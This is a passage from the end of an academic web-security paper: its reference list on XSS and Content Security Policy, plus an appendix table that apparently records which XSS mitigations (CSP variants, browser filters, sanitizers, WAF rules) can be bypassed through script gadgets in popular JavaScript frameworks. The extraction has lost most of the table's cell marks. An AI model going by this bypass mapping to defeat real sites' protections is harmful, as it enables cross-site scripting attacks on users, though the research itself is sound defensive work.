                                                                                                [28] Ross, D. Ie 8 xss filter architecture/implementation. Blog: http://blogs. tech-
                                                                                                     net. com/srd/archive/2008/08/18/ie-8-xss-filter-architecture-implementation. aspx
REFERENCES                                                                                           (2008).
 [1] Acker, S. V., Hausknecht, D., and Sabelfeld, A. Data Exfiltration in the Face              [29] Ross, D. Happy 10th birthday cross-site scripting! [online], https://blogs.msdn.
     of CSP. In AsiaCCS (2016).                                                                      microsoft.com/dross/2009/12/15/happy-10th-birthday-cross-site-scripting/,
 [2] Athanasopoulos, E., Pappas, V., Krithinakis, A., Ligouras, S., Markatos,                        2009.
     E. P., and Karagiannis, T. xjs: practical xss prevention for web application               [30] Stamm, S., Sterne, B., and Markham, G. Reining in the web with content
     development. In Proceedings of the 2010 USENIX conference on Web application                    security policy. In Proceedings of the 19th international conference on World wide
     development (2010), USENIX Association, pp. 13–13.                                              web (2010), ACM, pp. 921–930.
 [3] Bates, D., Barth, A., and Jackson, C. Regular expressions considered harmful               [31] Stamm, S., Sterne, B., and Markham, G. Reining in the web with content
     in client-side XSS filters. In WWW ’10: Proceedings of the 19th international                   security policy. In Proceedings of the 19th international conference on World wide
     conference on World wide web (New York, NY, USA, 2010), ACM, pp. 91–100.                        web (New York, NY, USA, 2010), WWW ’10, ACM, pp. 921–930.
 [4] Calzavara, S., Rabitti, A., and Bugliesi, M. Content security problems?:                   [32] Stock, B., Lekies, S., Mueller, T., Spiegel, P., and Johns, M. Precise Client-side
     Evaluating the effectiveness of content security policy in the wild. In Proceedings             Protection against DOM-based Cross-Site Scripting. In 23rd USENIX Security
     of the 2016 ACM SIGSAC Conference on Computer and Communications Security                       Symposium (USENIX Security ’14) (2014).
     (New York, NY, USA, 2016), CCS ’16, ACM, pp. 1365–1375.                                    [33] Tantek Celik, Daniel Glazman, I. H. P. L. J. W. Selectors level 4. W3C Editor’s
 [5] CERT/CC. CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in                               Draft (2017).
     Client Web Requests. [online], http://www.cert.org/advisories/CA-2000-02.html              [34] W3C. Content Content Security Policy Level 3. W3C Editor’s Draft, 10 May
     (01/30/06), February 2000.                                                                      2017, https://w3c.github.io/webappsec-csp/, May 2017.
 [6] Chen, E. Y., Gorbaty, S., Singhal, A., and Jackson, C. Self-exfiltration: The              [35] Weichselbaum, L., Spagnuolo, M., Lekies, S., and Janc, A. Csp is dead, long live
     dangers of browser-enforced information flow control. In Proceedings of the                     csp! on the insecurity of whitelists and the future of content security policy. In
     Workshop of Web (2012), vol. 2, Citeseer.                                                       Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications
 [7] Gundy, M. V., and Chen, H. Noncespaces: Using Randomization to Enforce                          Security (2016), ACM, pp. 1376–1387.
     Information Flow Tracking and Thwart Cross-site Scripting Attacks. In 16th                 [36] Weinberger, J., Akhawe, D., and Eisinger, J. Suborigins. W3C Editor’s Draft,
     Annual Network and Distributed System Security Symposium (NDSS 2009) (2009).                    18 May 2017, https://w3c.github.io/webappsec-suborigins/, May 2017.
 [8] Heiderich, M. Towards Elimination of XSS Attacks with a Trusted and Capability             [37] Zalewski, M. Postcards from the post-xss world. Online at http://lcamtuf.
     Controlled DOM. PhD thesis, Ruhr-University Bochum, 2012.                                       coredump. cx/postxss (2011).
 [9] Heiderich, M. Jsmvcomfg - to sternly look at javascript mvc and tem-
     plating frameworks.           [online], https://www.slideshare.net/x00mario/
     jsmvcomfg-to-sternly-look-at-javascript-mvc-and-templating-frameworks,
     2013.
[10] Heiderich, M. Mustache security wiki. [online], https://github.com/cure53/
     mustache-security, 2014.
                                                                                           14
     A   XSS MITIGATION BYPASSES VIA SCRIPT GADGETS IN JS FRAMEWORKS
            Framework                                                          CSP              Chrome XSS                     NoScript XSS Filter                     Google Closure HTML      ModSecurity OWASP
            / Library      CSP whitelists       CSP nonces   CSP unsafe-eval   strict-dynamic   Auditor      EDGE XSS filter   5.0.2                 DOMPurify 0.8.7   sanitizer (2017-05-01)   CRS 3.0.0

            Vue.js 2.3.0

            Aurelia
            (2017-03-21)

            AngularJS
            1.6.1

            Polymer                                                                                                                                  - (<template)     - (<template)
            1.7.1

            Underscore                                                         -
            1.8.3 /
            backbone

            Knockout                                                                                                                                                   - (data- or comments)
            3.4.1

            jQuery         -                    -
            Mobile 1.4.5

            Ember.js       -                    -
            2.10.2

            React                               -

            Closure                                                                                          - (<a.*)

            Ractive        - ({{}} uses eval)                                                                - (<script)       - (script node)       - (script)        - (script)               - (script)
            0.8.1

            Dojo 1.12.2                                                                                                                                                - (data-)

            Requirejs                                                                                        - (<script)
            2.3.2

            jQuery 3.1.1   -                    -                                                            - (<script)




15
            jQuery UI      -                    -
            1.12.1

            Bootstrap                                                                                                          - (HTML in HTML
            3.3.7                                                                                                              attr)
